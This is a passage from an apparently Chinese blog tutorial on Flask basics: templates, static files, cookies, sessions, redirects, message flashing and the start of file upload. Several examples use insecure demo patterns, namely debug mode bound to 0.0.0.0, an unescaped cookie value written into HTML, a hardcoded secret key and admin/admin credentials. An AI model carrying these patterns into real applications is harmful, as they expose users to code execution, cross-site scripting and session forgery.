<span class="title">hello_name</span><span class="params">(score=None)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>,marks = score)<span class="comment">#自动寻找目录下的templates文件夹下的html文件</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>访问<code>http://127.0.0.1:5000/hello/flask</code>则会输出<code>Hello flask!</code>标题</p><p><strong>Jinja2</strong>模板引擎使用以下分隔符从HTML转义。</p><ul><li><strong>{ % … %}</strong>：用于语句</li><li><strong>{ {  … } }</strong>：用于表达式可以打印到模板输出</li><li><strong>{ # … # }</strong>：用于未包含在模板输出中的注释</li><li><strong># … ##</strong>：用于行语句</li></ul><p>另外测试语句效果，修改hello.html为以下内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line">&#123;% if marks&gt;50 %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> Your result is pass!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Your result is fail<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>脚本中<code>@app.route(&#39;/hello/&lt;score&gt;&#39;)</code>修改为<code>@app.route(&#39;/hello/&lt;int:score&gt;&#39;)</code></p><p>则当访问<code>http://127.0.0.1:5000/hello/1</code>时输出<code>Your result is fail</code></p><p>则当访问<code>http://127.0.0.1:5000/hello/100</code>时输出<code>Your result is pass!</code></p><p>注意这里必须要对传入的score定义为int型，否则会被当成字符串处理，就会一直输出<code>Your result is pass!</code></p><h2 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h2><p>hello.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> = <span class="string">"text/javascript"</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">src</span> = <span class="string">"&#123; &#123;  url_for('static', filename = 'hello.js') &#125;&#125;"</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"button"</span> <span class="attr">onclick</span> = <span class="string">"sayHello()"</span> <span class="attr">value</span> = <span class="string">"Say Hello"</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>hello.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    alert(<span class="string">"Hello World"</span>)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">"hello.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>访问<code>http://127.0.0.1:5000/</code>点击Say Hello弹窗Hello World</p><h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,url_for,request,render_template,make_response,escape,session</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"><span class="meta">@app.route('/setcookie',methods = ['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setcookie</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">       user = request.form[<span class="string">'nm'</span>]</span><br><span class="line">       resp = make_response(render_template(<span class="string">'readcookie.html'</span>))</span><br><span class="line">       resp.set_cookie(<span class="string">'userID'</span>,user)</span><br><span class="line">       <span class="keyword">return</span> resp</span><br><span class="line"><span class="meta">@app.route('/getcookie')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcookie</span><span class="params">()</span>:</span></span><br><span class="line">   name = request.cookies.get(<span class="string">'userID'</span>)</span><br><span class="line">   a = <span class="string">"&lt;h1&gt;welcome '&#123; &#125;'&lt;/h1&gt;"</span>.format(name)</span><br><span class="line">   <span class="keyword">return</span> a</span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.0.102:5000/setcookie"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Enter userID<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span> <span class="attr">name</span>=<span class="string">'nm'</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'submit'</span> <span class="attr">value</span>=<span class="string">'Login'</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>readcookie.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span>  <span class="attr">href</span>=<span class="string">"http://192.168.0.102:5000/getcookie"</span>&gt;</span>Click here to read cookie<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>首先在访问<code>http://127.0.0.1:5000/</code>传入flask，点击Click here to read cookie即可看到<code>welcome &#39;flask&#39;</code></p><h2 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h2><p>session是存储在服务器上的，会话是客户端登录到服务器并注销服务器的时间间隔。需要在该会话中保存的数据会存储在服务器上的临时目录中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,url_for,request,render_template,make_response,escape,session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">'any random string'</span></span><br><span class="line"><span class="comment">#app.secret_key = os.urandom(12)</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        username = session[<span class="string">'username'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Logged in as '</span> + username + <span class="string">'&lt;br&gt;'</span> + <span class="string">"&lt;b&gt;&lt;a href = '/logout'&gt;click here to log out&lt;/a&gt;&lt;/b&gt;"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"You are not logged in &lt;br&gt;&lt;a href = '/login'&gt;&lt;/b&gt;"</span> + <span class="string">"click here to log in&lt;/b&gt;&lt;/a&gt;"</span></span><br><span class="line"><span class="meta">@app.route('/login', methods = ['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        session[<span class="string">'username'</span>] = request.form[<span class="string">'username'</span>]</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''</span></span><br><span class="line"><span class="string">   &lt;form action = "" method = "post"&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;&lt;input type = text name = username /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;&lt;input type = submit value = Login /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">   &lt;/form&gt;</span></span><br><span class="line"><span class="string">   '''</span></span><br><span class="line"><span class="meta">@app.route('/logout')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>,<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这里将session_key设置成了any random string</p><h2 id="重定向和错误"><a href="#重定向和错误" class="headerlink" title="重定向和错误"></a>重定向和错误</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,url_for,request,render_template,make_response,escape,session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login',methods = ['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> request.form[<span class="string">'username'</span>] == <span class="string">'admin'</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/success')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'logged in successfully'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>当用户输入不为admin时则直接302重定向到login界面</p><p>login.html</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;body&gt;</span><br><span class="line">      &lt;form action = <span class="string">"http://192.168.0.102:5000/login"</span> method = <span class="string">"post"</span>&gt;</span><br><span class="line">         &lt;p&gt;Enter Name:&lt;/p&gt;</span><br><span class="line">         &lt;p&gt;&lt;input type = "text" name = "username" /&gt;&lt;/p&gt;</span><br><span class="line">         &lt;p&gt;&lt;input type = "submit" value = "submit" /&gt;&lt;/p&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">   &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>报错：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,url_for,request,render_template,make_response,escape,session,abort</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login',methods = ['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form[<span class="string">'username'</span>] == <span class="string">'admin'</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            abort(<span class="number">401</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/success')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'logged in successfully'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>Flask.abort(code)</code>：带有错误代码的abort函数</p><ul><li><strong>400</strong> - 用于错误请求</li><li><strong>401</strong> - 用于未身份验证的</li><li><strong>403</strong> - Forbidden</li><li><strong>404</strong> - 未不到</li><li><strong>406</strong> - 表示不接受</li><li><strong>415</strong> - 用于不支持的媒体类型</li><li><strong>429</strong> - 请求过多</li></ul><p>若登录不是admin则报401：<code>Unauthorized</code>错误</p><h2 id="消息闪现"><a href="#消息闪现" class="headerlink" title="消息闪现"></a>消息闪现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,url_for,request,render_template,make_response,escape,session,abort,flash</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">12</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login',methods = ['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    error = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form[<span class="string">'username'</span>] != <span class="string">'admin'</span> <span class="keyword">or</span> request.form[<span class="string">'password'</span>] != <span class="string">'admin'</span>:</span><br><span class="line">            error = <span class="string">'Invalid username or password. Please try again!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">'You were successfully logged in'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, error = error)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>flash(message, category)</code>：将消息传递给下一个请求，该请求通常是一个模板。</p><ul><li><strong>message</strong>：参数是要闪现的实际消息。</li><li><strong>category</strong>：参数是可选的。它可以是“error”，“info”或“warning”。</li></ul><p><code>get_flashed_messages(with_categories, category_filter)</code>：从会话中删除消息</p><p>两个参数都是可选的。如果接收到的消息具有类别，则第一个参数是元组。第二个参数仅用于显示特定消息。第一个默认为False</p><p>典型的消息闪现模板：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% with messages = get_flashed_messages() %&#125;</span><br><span class="line">   &#123;% if messages %&#125;</span><br><span class="line">      &#123;% for message in messages %&#125;</span><br><span class="line">         &#123;&#123;  message &#125;&#125;</span><br><span class="line">      &#123;% endfor %&#125;</span><br><span class="line">   &#123;% endif %&#125;</span><br><span class="line">&#123;% endwith %&#125;</span><br></pre></td></tr></table></figure><p>下面给出html代码：</p><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&#123;% with messages = get_flashed_messages() %&#125;</span><br><span class="line">    &#123;% if messages %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">          &#123;% for message in messages %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123; &#123;  message &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          &#123;% endfor %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"> &#123;% endwith %&#125;</span><br><span class="line"> <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Flask Message Flashing Example<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span>&gt;</span>Do you want to <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">"&#123;&#123;  url_for('login') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>log in?<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>login.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   &#123;% if error %&#125;</span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Error:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> &#123;&#123;  error &#125;&#125;</span><br><span class="line">   &#123;% endif %&#125;</span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">""</span> <span class="attr">method</span> = <span class="string">post</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">dt</span>&gt;</span> </span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">text</span> <span class="attr">name</span> = <span class="string">username</span> <span class="attr">value</span> = <span class="string">"&#123;&#123; request.form.username &#125;&#125;"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">password</span> <span class="attr">name</span> = <span class="string">password</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">submit</span> <span class="attr">value</span> = <span class="string">Login</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>http://127.0.0.1:5000/</code>点击login后进入登录界面，随后如果输入的username和password不是admin的话会在界面上显示error消息，若登录成功则跳转到index页面上方显示登录成功消息</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>upload.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Upload new File<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% with messages = get_flashed_messages() %&#125;</span><br><span class="line">    &#123;% if messages %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">          &#123;% for message in messages %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;  message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          &#123;% endfor %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"> &#123;% endwith %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Upload new File<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">enctype</span>=<span class="string">multipart/form-data</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">file</span> <span class="attr">name</span>=<span class="string">file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Upload</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 